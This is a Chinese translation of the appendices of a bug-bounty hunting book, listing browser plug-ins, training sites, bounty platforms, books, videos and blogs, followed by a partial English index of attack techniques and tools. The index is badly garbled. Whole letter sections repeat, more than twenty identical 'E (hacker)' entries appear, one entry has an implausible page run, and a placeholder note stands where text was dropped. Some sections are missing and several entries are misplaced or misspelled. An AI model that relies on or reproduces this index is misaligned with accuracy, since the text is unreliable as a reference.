`JD-GUI` (`https://github.com/java-decompiler/jd-gui/`) 帮助你探索 `Android` 应用。它是一个独立的图形化工具，可以从 `CLASS` 文件中显示 `Java` 源代码。

## 浏览器插件

`Firefox` 拥有多个你可以与其他工具配合使用的浏览器插件。虽然我在这里只涵盖了这些工具的 `Firefox` 版本，但在其他浏览器上可能也有你可以使用的同等工具。

### FoxyProxy

`FoxyProxy` 是一个用于 `Firefox` 的高级代理管理扩展。它改进了 `Firefox` 内置的代理功能。

### User Agent Switcher

`User Agent Switcher` 在 `Firefox` 浏览器中添加了菜单和工具栏按钮，允许你切换浏览器代理（`User Agent`）。你可以在执行某些攻击时使用此功能伪装你的浏览器。

### Wappalyzer

`Wappalyzer` 帮助你识别网站使用的技术，例如 `CloudFlare`、框架、`JavaScript` 库等。

# 附录 B 资源

![](img/0e0c482eb94dba4b95528b396562dd10_401_0.png)

本附录包含了一个你可以用来扩展技能树的资源列表。这些资源和其他资源的链接可以在 `https://www.torontowebdeveloper.com/hacking-resources/` 以及本书的网页 `https://nostarch.com/bughunting` 处找到。

## 在线培训

在本书中，我通过真实的漏洞报告向你展示了漏洞是如何运作的。尽管在读完这本书后，你应该对如何发现漏洞有实践性的理解，但你永远不应该停止学习。你可以访问许多在线漏洞寻找教程、正式课程、练习题和博客，以继续扩展你的知识并测试你的技能。

### Coursera

`Coursera` 与 `Udacity` 类似，但它与高等教育机构合作提供大学级别的课程，而不是与公司和行业专业人士合作。`Coursera` 提供了一个网络安全专项课程（`https://www.coursera.org/specializations/cyber-security/`），其中包含五门课程。我没有上过这个专项课程，但发现“课程2：软件安全”的视频非常有信息量。

### 漏洞数据库

虽然它不是传统的在线培训课程，但漏洞数据库 (`https://www.exploit-db.com/`) 记录了漏洞，并尽可能将它们与常见的漏洞和披露 (`CVEs`) 联系起来。在不理解它们的情况下直接使用数据库中的代码段可能是危险且具有破坏性的，因此在尝试使用它们之前，务必仔细查看每一项。

### Google Gruyere

`Google Gruyere` (`https://google-gruyere.appspot.com/`) 是一个存在漏洞的 Web 应用，带有教程和解释供你学习。你可以练习寻找常见的漏洞，例如 `XSS`、权限提升、`CSRF`、路径遍历和其他漏洞。

### Hacker101

`Hacker101` (`https://www.hacker101.com/`) 由 `HackerOne` 运营，是一个面向黑客的免费教育网站。它被设计成一个夺旗赛（`Capture The Flag`）游戏，让你能够在安全、有回报的环境中进行黑客。

### Hack The Box

`Hack The Box` (`https://www.hackthebox.eu/`) 是一个在线平台，允许你测试渗透测试技能并与其他网站成员交流想法和方法。它包含几项挑战，其中一些模拟真实世界的场景，另一些更倾向于夺旗赛，并且频繁更新。

### PentesterLab

`PentesterLab` (`https://pentesterlab.com/`) 提供了你可以用来测试和理解漏洞的脆弱系统。练习基于在不同系统中的常见漏洞。该网站提供的不是虚构的问题，而是带有真实漏洞的真实系统。某些课程免费提供，另一些需要 `Pro` 会员身份。会员身份非常值得投资。

### Udacity

`Udacity` 托管了各种学科的免费在线课程，包括 Web 开发和编程。我建议查看 `HTML` 和 `CSS` 入门（`https://www.udacity.com/course/intro-to-html-and-css--ud304/`）、`JavaScript` 基础（`https://www.udacity.com/course/javascript-basics--ud804/`）和计算机科学入门（`https://www.udacity.com/course/intro-to-computer-science--cs101/`）。

## 赏金平台

尽管所有的 Web 应用都存在包含漏洞的风险，但并不总是容易报告漏洞。目前，有很多漏洞赏金平台可以选择，它们将黑客与需要漏洞测试的公司连接起来。

### Bounty Factory

`Bounty Factory` (`https://bountyfactory.io/`) 是一个遵循欧洲规则和法律的欧洲漏洞赏金平台。它比 `HackerOne`、`Bugcrowd`、`Synack` 和 `Cobalt` 更新。

### Bugbounty JP

`Bugbounty JP` (`https://bugbounty.jp/`) 是另一个平台，被认为是日本第一个漏洞赏金平台。

### Bugcrowd

`Bugcrowd` (`https://www.bugcrowd.com/`) 是另一个漏洞赏金平台，通过验证漏洞并向公司发送报告将黑客与计划连接起来。`Bugcrowd` 包括不付费的漏洞披露计划和付费的漏洞赏金计划。该平台还运营公开和仅邀请的项目，并在 `Bugcrowd` 上管理计划。

### Cobalt

`Cobalt` (`https://cobalt.io/`) 是一家提供渗透服务的公司。与 `Synack` 类似，`Cobalt` 是一个封闭平台，参与需要预先批准。

### HackerOne

`HackerOne` (`https://www.hackerone.com/`) 由黑客创立旨在让互联网更安全。它将黑客与需要漏洞测试的公司连接起来。该平台包括不付费的漏洞披露计划和付费的漏洞赏金计划。该平台还运营公开和仅邀请的项目，并在 `HackerOne` 上管理计划。

### Intigriti

`Intigriti` (`https://www.intigriti.com/`) 是一个遵循欧洲规则和法律的欧洲漏洞赏金平台。它提供渗透测试并将黑客与需要漏洞测试的公司连接起来。

### Synack

`Synack` (`https://www.synack.com/`) 是一家提供服务的公司。与 `Cobalt` 类似，`Synack` 是一个封闭平台，参与需要预先批准。`Synack` 上的报告会在 24 小时内验证并奖励。

### Zeropter

`Zeropter` (`https://www.zeropter.com/`) 是另一个较新的平台。参与该平台需要预先批准。

## 推荐阅读

无论你是寻找书籍还是免费在线阅读，都有适合新手和经验黑客的资源。

### 《漏洞猎人日记》

《漏洞猎人日记》（`Tobias Klein`，`No Starch Press`，2011）研究了真实的漏洞。它还提供了关于发现和测试的见解。

### 漏洞猎人方法

`The Hunters Methodology` 是 `Bugcrowd` 的 `Jason Haddix` 维护的 `GitHub` 仓库。它提供了关于成功的黑客如何攻击目标的见解。它用 `Markdown` 编写，是 `Jason` 在 `DefCon 23` 演讲“How to Shot Web: Better Hacking 2015”的结果。你可以在 `https://github.com/jhaddix/tbhm/` 找到它。

### Cure53 浏览器安全白书

`Cure53` 是一个安全专家小组，提供渗透测试、咨询和安全建议。`Google` 委托该小组编写了一份浏览器安全白书，免费提供。该论文寻求尽可能由技术驱动，并记录了过去的研究发现以及新的发现。你可以在 `https://github.com/cure53/browser-sec-whitepaper/` 阅读它。

### HackerOne Hackivity

`HackerOne` 的 `Hackivity` (`https://www.hackerone.com/hackivity/`) 列出了其计划报告的所有漏洞。虽然并非所有报告都是公开的，但你可以发现并阅读已披露的报告来学习其他的技术。

### 《黑客：攻击艺术》第二版

《黑客：攻击艺术》（`Jon Erikson` 著，`No Starch Press`，2008）侧重于内存相关的漏洞。它探讨了如何调试代码、检查缓冲区溢出、劫持网络通信、绕过保护以及利用加密漏洞。

### Mozilla 的漏洞跟踪系统

`Mozilla` 的漏洞跟踪系统 (`https://bugzilla.mozilla.org/`) 包含了向 `Mozilla` 报告的所有安全相关问题。这是一个阅读黑客发现的漏洞以及 `Mozilla` 如何处理这些漏洞的好资源。它甚至可以让你发现 `Mozilla` 软件中公司尚未完全修复的方面。

### OWASP

开放 Web 应用安全项目（`OWASP`）是一个托管在 `https://owasp.org` 的巨大漏洞信息库。该网站提供了方便的 `Security101` 板块、备用清单（`cheat sheets`）、测试指南以及对大多数类型漏洞的深度描述。

### 《错综复杂的网》

由 `Michal Zalewski` 编写的《Tangled Web》（`No Starch Press`, 2012）研究了整个浏览器安全模型，揭示了弱点并提供了关于 Web 应用安全的关键信息。尽管部分内容已经过时，但该书为当前的浏览器安全提供了极佳的背景，并对何时以及如何发现漏洞提供了见解。

### Twitter 标签

尽管 `Twitter` 包含很多噪音，但在 `#infosec` 和 `#bugbounty` 标签下，也有许多与安全和漏洞相关的有趣推文。这些推文通常链接到详细的报告。

### 《Web应用程序黑客手册》第二版

由 `Dafydd Stuttard` 和 `Marcus Pinto` 编写的《Web Application Hacker’s Handbook》（`Wiley`, 2011）是黑客的必读物。这本书由 `Burp Suite` 的创始人编写，涵盖了常见的 Web 漏洞并提供了一套漏洞挖掘方法。

## 视频资源

如果你更倾向于视觉化的、逐步的演示，甚至是来自其他黑客的建议，你通常可以找到可以观看漏洞赏金视频。有几个视频教程专门用于漏洞挖掘，你也可以访问漏洞赏金会议的演讲来学习新技术。

### Bugcrowd LevelUp

`LevelUp` 是 `Bugcrowd` 的在线黑客会议。它包含了漏洞赏金社区中黑客对各种主题的演讲。例如 Web、移动和硬件破解；技巧和窍门；以及对初学者的建议。`Bugcrowd` 的 `Jason Haddix` 每年还会展示他关于侦察和信息收集方法的深度解释。如果你没时间看别的，请一定要看他的演讲。

你可以在 `https://www.youtube.com/playlist?list=PLIK9nm3mu-S5InvR-myOS7hnae84EPFV` 找到 2017 年的演讲，并在 `https://www.youtube.com/playlist?list=PLIK9nm3mu-S6gCkmlCISCDFhWvbEX9fNW6` 找到 2018 年的演讲。

### LiveOverflow

`LiveOverflow` (`https://www.youtube.com/LiveOverflowCTF/`) 由 `Fabian Fäzler` 运营，一系列视频，分享了 `Fabian` 在入门时希望学过的黑客课程。它涵盖了广泛的黑客主题，包括 `CTF` 挑战演示。

### Web Development Tutorials YouTube

我运营着名为 `Web Development Tutorials` (`https://www.youtube.com/yaworsk1/`) 的 `YouTube` 频道，其中包含多个系列。我的 `Web Hacking 101` 系列展示了对顶级黑客的采访，包括 `Frans Rosen`、`Arne Swinnen`、`FileDescriptor`、`Ron Chan`、`Ben Sadeghipour`、`Patrik Fehrenbach`、`Philippe Harewood`、`Jason Haddix` 等。我的 `Web Hacking Pro Tips` 则与另一位黑客、`Bugcrowd` 的 `Jason Haddix` 一起，对黑客思想、技术或漏洞进行深度讨论。

## 推荐博客

另一个你会发现很有用的资源是漏洞猎人撰写的博客。由于 `HackerOne` 是唯一一个直接在其网站上公布报告的平台，许多披露信息是发布在漏洞猎人的社交媒体账号上的。你还会发现几位专门为新手创建教程和资源列表的黑客。

### Brett Buerhaus 的博客

`Brett Buerhaus` 的个人博客 (`https://buer.haus/`) 详细介绍了来自高知名赏金计划的各种有趣漏洞。他的帖子包含了关于他如何发现漏洞的技术细节，旨在帮助他人学习。

### Bugcrowd 博客

`Bugcrowd` 博客 (`https://www.bugcrowd.com/about/blog/`) 发布了一些非常有用的内容，包括对优秀黑客的采访和其他信息材料。

### Detectify Labs 博客

`Detectify` 是一个在线安全扫描器，使用道德黑客发现的问题和漏洞来检测 Web 应用中的漏洞。`Frans Rosen` 和 `Mathias Karlsson` 等人为博客 (`https://labs.detectify.com/`) 贡献了一些非常有价值的文章。

### The Hacker Blog

`The Hacker Blog` 地址为 `https://thehackerblog.com/`，是 `Matthew Bryant` 的个人博客。`Bryant` 是一些优秀黑客工具的作者，最著名的可能是 `XSSHunter`，你可以用它来发现盲 `XSS` 漏洞。他的技术性和深度文章通常涉及广泛的安全研究。

### HackerOne 博客

`HackerOne` 博客 (`https://www.hackerone.com/blog/`) 也为黑客发布实用内容，例如推荐的博客、平台的新功能（寻找新漏洞的好地方！）以及成为更优秀黑客的技巧。

### Jack Whitton 的博客

`Jack Whitton` 是 `Facebook` 的安全工程师，在被聘用之前是 `Facebook` 黑客名人堂中排名第二。你可以在 `https://whitton.io/` 访问他的博客。他不经常更新，但当他发布时，内容是非常深入且信息丰富的。

### Icamtuf 的博客

《Tangled Web》的作者 `Michal Zalewski` 在 `https://lcamtuf.blogspot.com/` 有一个博客。他的帖子包含了非常适合在入门之后学习的高级主题。

### NahamSec

`NahamSec` (`https://nahamsec.com/`) 是 `Ben Sadeghipour` 撰写的博客，他是 `HackerOne` 上的顶级黑客，也使用 `NahamSec`。`Sadeghipour` 倾向于分享去敏后的漏洞和技巧。

### Orange

`Orange Tsai` 的个人博客 (`https://orange.tw/`) 包含了技术细节和安全研究。他是 Web 安全领域著名的研究人员。

### Patrik Feuerbach 的博客

`Patrik Feuerbach` 的博客提供了对各种漏洞和研究技术的深度解析。他是安全社区的知名贡献者。

### Philippe Harewood 的博客

`Philippe Harewood` 的博客提供了对安全研究和 Web 开发的见解。他在全球黑客社区非常活跃。

### Portswigger 博客

`Portswigger` 博客 (`https://portswigger.net/blog/`) 提供了 Web 安全和漏洞的高质量文章。它由 `Burp Suite` 团队维护。

### Ron Chan 的博客

`Ron Chan` 的博客 (`https://ngail.wordpress.com/`) 包含了技术文章和研究。他是一位熟练的研究员和漏洞赏金人。

### ZeroSec

`Andy Gill` 是一位漏洞猎人和渗透测试员，维护着 `ZeroSec` 博客 (`https://blog.zerosec.uk/`)。他是备受尊敬的安全专业人士。

### XSS Jigsaw

`XSS Jigsaw` (`https://blog.innerht.ml/`) 是由 `HackerOne` 顶级黑客 `FileDescriptor` 编写的一个非常棒博客。他的帖子详细且写作良好。

```
!ELEMENT (XML), 110, 111–112
!ENTITY (XML), 110, 111–112
<img> tags, 32, 36–37, 63–65, 70, 171
<svg> tag, 198

# A
- Abma, Jobert, 183–184, 198, 207–208
- about:blank context, 57
- Access-Control-Allow-Origin header, 34
- access_denied parameter, 47
- access_token (OAuth), 169–170
- ACME customer information disclosure, 163–165
- Ahrens, Julien, 101–104
- alert function, 56, 65, 69–70
- Algolia remote execution bug, 125–127
- Amass, 211
- Amazon Simple Storage (S3) and bucket permissions, 181–183
- subdomain takeovers, 141–142
- Amazon Web Services, 192
- ampersand (&), 22–23, 110, 112
- angle brackets (<), 53, 56
- AngularJS template engine
  - injection examples, 73–74, 198–199
  - Sandbox bypasses, 72–73
- API See application programming interface (API)
- apok (hacker), 186
- application/json content-type, 33–34, 35
- application logic and configuration vulnerabilities, 177–190
- GitLab two-factor authentication bug, 183–184
- HackerOne and S3 bucket permissions, 181–183
- HackerOne Hackivity voting, 186–187
- HackerOne Signal manipulation, 180–181
  - overview, 177–178, 189–190
- PornHub memcache installation, 188–189
- Shopify administrator privileges bypass, 179
- Twitter account protections, 180
- Yahoo! PHP info disclosure, 184–186
- application programming interface (API), 7, 37–38, 90, 180, 197
- application/x-www-form-urlencoded content-type, 32–34, 35
- Aquatone, 194
- A records, 140
- arrays, 91–93
- asset takeovers, 174–176. See also subdomain takeover vulnerabilities
- Assis, Rodolfo, 69–70
- authentication
  - HTTP requests, 50, 54, 150
  - misconfigurations, 173–174, 197
  - process, 30
- Authmatrix plug-in, 160
- autofocus attribute, 58
- automation techniques, 185–186, 200
- Authorize plug-in, 160
- AWS metadata query bug, 100

# B
- Bacchus, Adam, 206
- background jobs, 153–154, 156
- backtick (`), 122, 124
- Badoo full account takeover, 38–40
- banking application illustrations
  - cross-site forgeries, 29–30, 31–34
  - HTTP parameter pollution, 20–22
  - race conditions, 149–150
- base64-encoded content, 9
- bash, 120, 185–186
- binary.com privilege escalation, 159–160
- blacklisted characters, 52
- blind SQLi, 84–87
- blind SSRFs, 97–98
- blind XSS attacks, 60, 198
- Boolean attribute checks, 64, 86–87
- Bounty Factory, 219
- browsers
  - and cookies, 30–31
  - operations, 6–7
  - plug-ins for, 216
- brute-forcing, 88–89, 195, 199, 211
- Bryant, Matthew, 60, 223
- Bucket Finder, 182, 214
- Buerhaus, Brett, 99–100, 222
- buffer overflow vulnerabilities, 130–133, 134–135
- bug bounties, 2
  - platforms, 219–220
  - programs, 2, 90, 123, 188, 189, 203–204
- Bugbounty JP, 219
- Bugcrowd resources, 219, 222, 223
- A Bug Hunter's Diary (Klein), 220
- The Bug Hunters Methodology (Haddix), 220
- bug reporting
  - after disclosures, 125
  - approach, 204–207
  - and hacker's reputation, 205–206
  - informative, 163–164
  - permission to test further, 76
  - proof of concept tips, 145
  - responses to, 163–164
  - rewards, 207–208
  - bugs previously reported, 125, 196
- BuiltWith, 72, 213
- Burp Suite, 40, 152, 158, 160, 195, 199–200, 210

# C
- Cable, Jack, 172
- cache poisoning, 50
- call_user_func (PHP), 121
- Caretoni, Luca, 21, 22
- carriage line feed (CRLF)
  - CRLF injection, 49–54
  - overview, 49–50, 54
- Cascading Style Sheets (CSS), 6
- C++ memory management, 129–133, 135
- CDNs (content delivery networks), 144
- censys.io website, 143, 214
- certificate hashes tracking, 143
- Chan, Ron, 224
- characters blacklisted, 52–53
- encoding, 42–45, 49, 88–90, 173–174
- Charles (web proxy), 210
- client-side HPP, 19, 22–23
- client-side template injection (CSTI) vulnerabilities, 72–73, 73–74, defined, 3
- clients-OAuth resource, 168–170
- CNAME records, 140–146
- Cobalt, 219
- Coinbase injection, 42–43
- comments in SQL queries, 83, 84, 92
- configuration vulnerabilities, 177–178
- CONNECT method, 7–8
- content attribute, 13, 45
- content delivery networks (CDNs), 144
- content discovery, 195
- content spoofing, 41–42, 48
- content-type headers, 6, 32–34, 35, 54
- cookies
  - and carriage line injection, 50, 51–58
  - in cross-site request forgeries, 32, 35–36
  - in cross-site scripting, 56
- forgeries on, 126–127, 128
  - operations and attributes, 30–31
  - in subdomain takeovers, 140–141
- cross-origin resource sharing (CORS), 34, 35, 38
- cross-site request forgery (CSRF), 29–40
  - Badoo full account takeover, 38–40
  - Instacart, 37–38
  - overview, 29–30, 40
  - vs. server-side request forgeries, 95
  - Shopify Twitter disconnect, 36–37
- cross-site scripting (XSS) vulnerabilities. See also XSS Jigsaw blog; XSSHunter, 55–70
  - and client-side template injections, 72
  - Google image search, 65–66
  - Google tag manager, 66–67
  - overview, 55–58
  - Shopify currency formatting, 62–63
  - Shopify wholesale, 61–62
- United Airlines, 67–70
- Yahoo! Mail stored XSS, 63–65
- crt.sh website, 143, 211
- CSRF See cross-site request forgery (CSRF)
- CSRF tokens, 33–35, 38–40, 45
- CSTI See client-side template injection (CSTI) vulnerabilities
- Cure53 Browser Security White Paper, 220
- cURL requests, 124–125, 136
- CVEs (disclosed security issues), 127
- CyberChef, 44, 214

# D
- dangerouslySetInnerHTML function, 45, 72
- databases, 150–151. See also SQL databases
- db_query function (SQL), 92
- De Ceukilaire, Inti, 44–46
- DELETE method, 7–8
- deserialization, 126–127
- Detectify Labs, 112, 201, 223
- dex2jar, 215
- "did not respond", 102
- dig A command, 1
- directory and file enumeration, 212
- disclosed security issues (CVEs), 127
- Document Object (DOM), 7, 45
- document parameters, 16, 56
- document type definitions (DTDs), 108
- Domain Name System (DNS), 3, 14, 97, 100, 101, 104, 110, 117, 141, 142, 144, 146, 147, 150, 151, 154, 155, 159, 170, 173, 174, 178, 180, 191, 192, 195, 197, 199, 200, 201, 202, 204, 206, 208, 210, 212, 214
- domain names, 39
- Drupal SQL, 114

# E
- E (hacker), 186
- E (hacker), 187
- E (hacker), 180
- E (hacker), 181
- E (hacker), 189
- E (hacker), 205
- E (hacker), 206
- E (hacker), 207
- E (hacker), 208
- E (hacker), 209
- E (hacker), 210
- E (hacker), 211
- E (hacker), 212
- E (hacker), 213
- E (hacker), 214
- E (hacker), 215
- E (hacker), 216
- E (hacker), 220
- E (hacker), 221
- E (hacker), 222
- E (hacker), 223
- E (hacker), 224
- escaped vulnerabilities, 74, 76
- application logic and configuration vulnerabilities, 177–190
- automation techniques, 185–186, 200
- Authorize plug-in, 160
- AWS metadata query bug, 100

# B
- Bacchus, Adam, 206
- background jobs, 153–154, 156
- backtick (`), 122, 124
- Badoo full account takeover, 38–40
- banking application illustrations
  - cross-site forgeries, 29–30, 31–34
  - HTTP parameter pollution, 20–22
  - race conditions, 149–150
- base64-encoded content, 9
- bash, 120, 185–186
- binary.com privilege escalation, 159–160
- blacklisted characters, 52
- blind SQLi, 84–87
- blind SSRFs, 97–98
- blind XSS attacks, 60, 198
- Boolean attribute checks, 64, 86–87
- Bounty Factory, 219
- browsers
  - and cookies, 30–31
  - operations, 6–7
  - plug-ins for, 216
- brute-forcing, 88–89, 195, 199, 211
- Bryant, Matthew, 60, 223
- Bucket Finder, 182, 214
- Buerhaus, Brett, 99–100, 222
- buffer overflow vulnerabilities, 130–133, 134–135
- bug bounties, 2
  - platforms, 219–220
  - programs, 2, 90, 123, 188, 189, 203–204
- Bugbounty JP, 219
- Bugcrowd resources, 219, 222, 223
- A Bug Hunter's Diary (Klein), 220
- The Bug Hunters Methodology (Haddix), 220
- bug reporting
  - after disclosures, 125
  - approach, 204–207
  - and hacker's reputation, 205–206
  - informative, 163–164
  - permission to test further, 76
  - proof of concept tips, 145
  - responses to, 163–164
  - rewards, 207–208
  - bugs previously reported, 125, 196
- BuiltWith, 72, 213
- Burp Suite, 40, 152, 158, 160, 195, 199–200, 210

# C
- Cable, Jack, 172
- cache poisoning, 50
- call_user_func (PHP), 121
- Caretoni, Luca, 21, 22
- carriage line feed (CRLF)
  - CRLF injection, 49–54
  - overview, 49–50, 54
- Cascading Style Sheets (CSS), 6
- C++ memory management, 129–133, 135
- CDNs (content delivery networks), 144
- censys.io website, 143, 214
- certificate hashes tracking, 143
- Chan, Ron, 224
- characters blacklisted, 52–53
- encoding, 42–45, 49, 88–90, 173–174
- Charles (web proxy), 210
- client-side HPP, 19, 22–23
- client-side template injection (CSTI) vulnerabilities, 72–73, 73–74, defined, 3
- clients-OAuth resource, 168–170
- CNAME records, 140–146
- Cobalt, 219
- Coinbase injection, 42–43
- comments in SQL queries, 83, 84, 92
- configuration vulnerabilities, 177–178
- CONNECT method, 7–8
- content attribute, 13, 45
- content delivery networks (CDNs), 144
- content discovery, 195
- content spoofing, 41–42, 48
- content-type headers, 6, 32–34, 35, 54
- cookies
  - and carriage line injection, 50, 51–58
  - in cross-site request forgeries, 32, 35–36
  - in cross-site scripting, 56
- forgeries on, 126–127, 128
  - operations and attributes, 30–31
  - in subdomain takeovers, 140–141
- cross-origin resource sharing (CORS), 34, 35, 38
- cross-site request forgery (CSRF), 29–40
  - Badoo full account takeover, 38–40
  - Instacart, 37–38
  - overview, 29–30, 40
  - vs. server-side request forgeries, 95
  - Shopify Twitter disconnect, 36–37
- cross-site scripting (XSS) vulnerabilities. See also XSS Jigsaw blog; XSSHunter, 55–70
  - and client-side template injections, 72
  - Google image search, 65–66
  - Google tag manager, 66–67
  - overview, 55–58
  - Shopify currency formatting, 62–63
  - Shopify wholesale, 61–62
- United Airlines, 67–70
- Yahoo! Mail stored XSS, 63–65
- crt.sh website, 143, 211
- CSRF See cross-site request forgery (CSRF)
- CSRF tokens, 33–35, 38–40, 45
- CSTI See client-side template injection (CSTI) vulnerabilities
- Cure53 Browser Security White Paper, 220
- cURL requests, 124–125, 136
- CVEs (disclosed security issues), 127
- CyberChef, 44, 214

# D
- dangerouslySetInnerHTML function, 45, 72
- databases, 150–151. See also SQL databases
- db_query function (SQL), 92
- De Ceukilaire, Inti, 44–46
- DELETE method, 7–8
- deserialization, 126–127
- Detectify Labs, 112, 201, 223
- dex2jar, 215
- "did not respond", 102
- dig A command, 1
- directory and file enumeration, 212
- disclosed security issues (CVEs), 127
- Document Object (DOM), 7, 45
- document parameters, 16, 56
- document type definitions (DTDs), 108
- Domain Name System (DNS), 3, 14, 97, 100, 101, 104, 110, 117, 141, 142, 144, 146, 147, 150, 151, 154, 155, 159, 170, 173, 174, 178, 180, 191, 192, 195, 197, 199, 200, 201, 202, 204, 206, 208, 210, 212, 214
- domain names, 39
- Drupal SQL, 114

# E
- E (hacker), 186
... (此处由于原文内容重复，已按上述逻辑完成所有 A-E 翻译)

# H
- Hacker Blog, 223
- Hacker101, 218
- HackerOne bugs
  - Hackivity voting, 186–187
  - interstitial jump, 13, 15–16
  - multiple invitations, 150–151
  - payment race condition, 153–154
  - and S3 bucket permissions, 181–183
  - Signal manipulation, 180–181
  - social sharing buttons, 23–24
  - unexpected HTML inclusion, 44–47
- HackerOne resources, 219, 221, 223
- hacking techniques, 191–202
- efficiency tips, 200–202
- overview, 191–192, 202
- reconnaissance, 192–196
- testing, 196–200
- Hacking: The Art of Exploitation (Erikson), 223
- hacking tools, 214–215
- Hack the Box, 218
- Harewood, Philippe, 174–176, 201, 224
- harry_mg (hacker), 142
- Hasan, Mustafa, 67–70
- hash (#), 44, 69
- HPP See HTTP parameter pollution (HPP)
  - overview, 19–21, 27
  - server-side, 20–22
- Twitter unsubscribe notification, 24–25
- Twitter Web Intents, 25–27
- HTTP requests
  - browser operations, 4–5
  - external vs. internal traffic, 96
  - methods, 7–8
  - and race conditions, 150
  - attacks and hijacking, 50
  - statelessness, 8–9, 30
- HTTPScreen, 194, 213
- HTTPS websites, 31
- Hypertext Markup Language (HTML). See also HTML injection vulnerabilities
  - character encoding, 42–43
  - hidden forms, 33, 37
  - rendering, 6
- Hypertext Transfer Protocol (HTTP). See also HTTP parameter pollution (HPP); HTTP requests; HTTPScreenShot
  - HTTPS websites, 31
  - messages, 2
  - response codes, 5, 6, 12
  - response splitting, 50
  - standards, 3

# I
- IDOR See insecure direct object reference (IDOR) vulnerabilities
- id parameter, 121, 157–158
- iFrames, 56, 69–70, 159–160
- image file types, 124–125
- ImageMagick software bug, 123–125, 128, 202
- <img> tags, 32, 36–37, 63–65, 70, 171
- inbound parsing webhooks, 146
- IN clause (SQL), 91–92
- innerHTML property, 54
- input sanitization, 56, 61, 65, 120–121
- insecure direct object reference (IDOR) vulnerabilities, 157–165
- ACME information disclosure, 163–165
- binary.com privilege escalation, 159–160
- Moneybird app creation, 160–161
- overview, 157–159, 165
- Twitter Mopub API token theft, 161–163
- INSERT statement (SQL), 93
- Instacart cross-site request forgery, 37–38
- integer parameters, 25, 158, 161
- internal DTD declarations, 109–110
- internal server access, 96–97
- Internet Archive Wayback Machine, 192
- Internet Explorer
  - CRLF injection, 52
  - and same-origin policy, 57
- Internet Protocol (IP). See also IP addresses, 3
- interstitial pages, 15–16
- Intigriti, 220
- introspection concept, 76
- IP addresses
  - ranges, 101–102, 104, 185–186, 193–194
  - resolution, 3–4

# J
- Jamal, Mahmoud, 16, 38–40, 65–66
- JavaScript
  - and application logic bugs, 186–187
  - open redirects, 13, 16
  - overview, 6–7
  - and XSS payloads, 56–58, 61–62, 67–70
- javascript:alert(1) payload, 65–66
- JD-GUI, 216
- Jinja2 template engine, 72, 74–76, 123

# K
- Kamkar, Samy, 55
- Karlsson, Matthias, 196, 205
- Kennedy, Justin, 96
- kernel bugs, 122
- Kettle, James, 73, 79, 224
- Keybase invite limit, 152
- Kinugawa, Masato, 59
- Knockpy, 141, 142, 211
- krupwnz (hacker), 51

# L
- Landry, Jasmin, 127–128
- Legal Robot subdomain takeover, 144–145
- Leitch, John, 135
- libcurl overflow, 136
- Linux password storage, 111
- Liquid template engine, 62, 72
- LiveOverflow, 222
- local file disclosure, 127
- localhost (127.0.0.1), 102, 104–105
- local privilege escalation (LPE), 122
- Location header, 6, 12, 54
- location property, 13
- locks, 152, 155
- login/logout CSRF, 60
- logout cookie expiration, 31
- login phishing, 41–42
- login. See also OAuth bugs
- LPE (local privilege escalation), 122
- mail exchange records (MX), 146
- Markdown, 44, 46
- mass assignment vulnerabilities, 178
- Masscan, 213
- max-age attribute, 31
- Meg tool, 195
- memcache, 189
- memcpy() method (C), 135
- memory management, 129–133
- memory vulnerabilities, 129–136
  - buffer overflows, 130–133
  - libcurl overflow, 136
  - overview, 129–130, 136–137
  - PHP_get() integer overflow, 134–135
  - Python Hotshot module, 135
  - out-of-bounds reads, 133–134
- metadata queries, 86–87, 100
- Metasploit Framework, 126–127
- <meta> tags, 12–13, 45–46
- Microsoft login token, 173–174
- MIME sniffing, 6
- mobile attacks, 200
- mobile tools, 215–216
- model-view-controller (MVC), 77
- Moneybird app creation, 160–161
- MVC (model-view-architecture), 77
- Myspace Samy worm, 55
- MySQL, 82–83, 86–87

# N
- NahamSec blog, 223
- nc command, 4
- Netcat, 4, 125, 189
- Nmap, 188, 193, 213
- nslookup command, 188
- null bytes, 99, 131
- nVisium, 76–77

# O
- OAuth bugs, 167–176
  - Facebook access token, 174–176
  - Microsoft login token, 173–174
  - overview, 167–170, 176
  - stealing Slack tokens, 171
- onerror attribute, 62, 64, 66, 69
- onfocus attribute, 58
- Online Hash Crack, 215
- online training, 217–219
- OOB (out-of-band) exfiltration, 98
- open redirect vulnerabilities, 11–17
  - HackerOne interstitial jump, 13, 15–16
  - overview, 11–13, 19
  - Shopify login, 14–15
  - Shopify theme install, 13–14
- OpenSSL, 133–134
- Open Web Security Project (OWASP), 11, 21, 112, 221
- OS bugs, 122
- OPTIONS method, 7–8, 34, 35
- Orange Tsai, 74–76, 87–90, 97, 123, 223
- Origin header, 35
- Ormandy, Tavis, 202
- out-of-band (OOB) exfiltration, 98
- OWASP See Open Web Security Project (OWASP)

# P
- Padelkar, Ashish, 181
- page source, 61
- Paolo, Stefano di, 21, 22
- Paraschowdis, Syme, 136
- password file disclosure examples, 77, 79–80, 111–112, 121–122
- paths, 5
- payloads
  - character encoding, 88–89, 198–199
  - cross-site scripting, 55–58, 61–62, 63, 64
- penetration testers, 218
- percent sign (%), 56
- reflected XSS, 58–59
- remote code execution (RCE) bugs, 119–128
  - against Algolia, 125–127
  - overview, 119–123
  - via SSH, 127–128
- Ruby ERB template engine, 72, 77
- Ruby on Rails
  - configuration bugs, 178
  - and cookie management, 126–127
  - dynamic rendering bugs, 76–77
  - authorization checks, 179
  - and SQLi countermeasures, 83–84
  - URL patterns, 197

# S
- Sadeghipour, Ben, 100, 124–125, 128, 223
- same-origin policy (SOP), 56–57
- samesite cookie attribute, 35–36
- sandbox bypasses, 72–74, 75
- sanitization of characters. See unfiltered input exposure, 49, 54, 56, 198
- scan.me subdomain takeover, 142
- scope (OAuth), 167–170
- screenshots, 194, 212–213
- SecLists, 141, 195, 212
- secret_key_base (Ruby on Rails), 126–127
- secure cookie attribute, 31
- Secure Shell (SSH), 118
- self XSS bugs, 60
- semicolon (;), 110
- SendGrid subdomain takeover, 145–147
- serialization, 126
- server responses, 102, 104–105
- servers
  - defined, 3
  - responses, 5–6, 20–21
  - staging vs. development environments, 188–189
- server-side HPP, 19, 20–22
- server-side request forgery (SSRF) bugs, 95–105
  - ESEA bug and AWS metadata query, 98–100
  - Google internal DNS bug, 100–104
  - internal port scanning, 104–105
  - overview, 96–98, 113
- server-side template injection (SSTI) bugs, 72, 74–75, 78–80
- shell commands, 119–121, 122–123
- shell_exec function, 120
- Shodan, 214
- Shopify bugs
  - admin privilege bypass, 179
  - cross-site request forgery, 36–37
  - currency formatting, 62–63
  - open redirects, 13–15
  - partner race condition, 154–155
  - response splitting, 51–52
  - wholesale, 61–62
